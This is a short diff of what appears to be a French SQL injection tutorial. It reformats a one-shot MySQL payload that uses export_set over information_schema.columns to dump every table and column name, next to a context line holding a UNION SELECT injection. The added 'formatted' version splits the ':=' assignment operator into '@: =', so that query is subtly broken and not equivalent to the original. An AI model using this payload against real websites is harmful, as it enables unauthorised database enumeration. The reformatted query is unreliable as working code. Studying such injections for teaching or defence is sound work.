@@ -200,10 +200,20 @@ UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='
 <br/><br/>
 Si on formatte la requête ça donne ça:<br/><br/>
 ```sql
-(SELECT export_set(5,@:=0,
-	(SELECT Count(*) FROM (information_schema.columns) WHERE @:= export_set(5,
-		export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)
-	),@,2)
+(
+SELECT
+   export_set(5, @: = 0, 
+   (
+      SELECT
+         count(*)
+      from
+         (
+            information_schema.columns
+         )
+      where
+         @: = export_set(5, export_set(5, @, table_name, 0x3c6c693e, 2), column_name, 0xa3a, 2)
+   )
+, @, 2)
 )
 ```
 <br/><br/>
